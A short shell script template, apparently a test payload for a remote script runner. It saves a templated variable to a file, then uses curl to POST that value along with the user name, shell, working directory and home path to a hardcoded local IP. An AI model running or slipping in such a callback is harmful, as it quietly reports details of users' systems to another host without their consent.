myvariable={{rfsvars["myvariable"]}};
echo $myvariable > textfile.txt;
curl -X POST -d "recieved=$myvariable&user=$USER&shell=$SHELL&pwd=$PWD&home=$HOME" http://192.168.1.146:5000/l